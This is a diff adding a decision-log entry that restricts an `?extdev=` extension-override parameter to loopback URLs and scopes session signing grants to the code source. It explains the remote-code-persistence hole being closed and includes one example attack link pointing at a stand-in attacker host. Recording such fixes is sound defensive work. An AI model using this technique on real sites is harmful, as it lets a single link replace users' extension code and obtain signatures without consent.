@@ -2,6 +2,30 @@
 
 Newest first. Each entry: what was decided, the alternatives, why.
 
+## 2026-08-31 — `?extdev=` accepts loopback URLs only; session grants are keyed on the code source
+
+**Decision.** `useDevOverride` only writes an override from the page URL when it parses as `http(s)` with a loopback
+hostname (`localhost`, `*.localhost`, `127.0.0.1`, `[::1]`); any other value is ignored (the parameter is still
+stripped). Overrides for other hosts can only be typed into the desktop Settings editor. The sign dialog shows a warning
+while an override is active, the "allow for this session" grant includes the code source in its key, changes to the
+`extensions` and `seedExtension` metadata keys are always confirmed, and **Approve** is inert for ~500 ms after the
+dialog opens.
+
+**Alternatives.** Accept any `http(s)` URL (the original behaviour); require a native `confirm()` before writing; drop
+`?extdev=` on the web entirely and use only the settings editor.
+
+**Why.** The original behaviour was a remote-code-persistence primitive: `useDevOverride` consumed
+`?extdev=<any http(s) URL>` with no confirmation, wrote it to `localStorage` keyed only by extension id, stripped the
+parameter, and the frame then loaded that URL with the full bridge and the published extension's permissions. Because
+`localStorage` is per origin and a gateway such as hyper.media serves every `/hm/<uid>/…` site, a single link
+(`https://hyper.media/hm/X/board?extdev=https://attacker.example/e.html`) would silently replace extension E's code for
+the victim on every site on that origin where E is installed, persistently, and — with a session grant keyed on
+`(extension, site, account)` — sign without a dialog. Restricting to loopback keeps every documented workflow
+(`?extdev=http://localhost:5181`, the browser test's `http://127.0.0.1:1/`) working with no extra prompt, while a
+hostile link can no longer point a browser at remote code. The dialog warning, the code-source-scoped grant, the
+always-confirm keys and the arming delay close the remaining ways an override or a decoy click could turn a grant into a
+signature.
+
 ## 2026-08-31 — Start with full-page extensions, not custom blocks
 
 **Decision.** The first extension kind is `page`: a whole app under the site header.
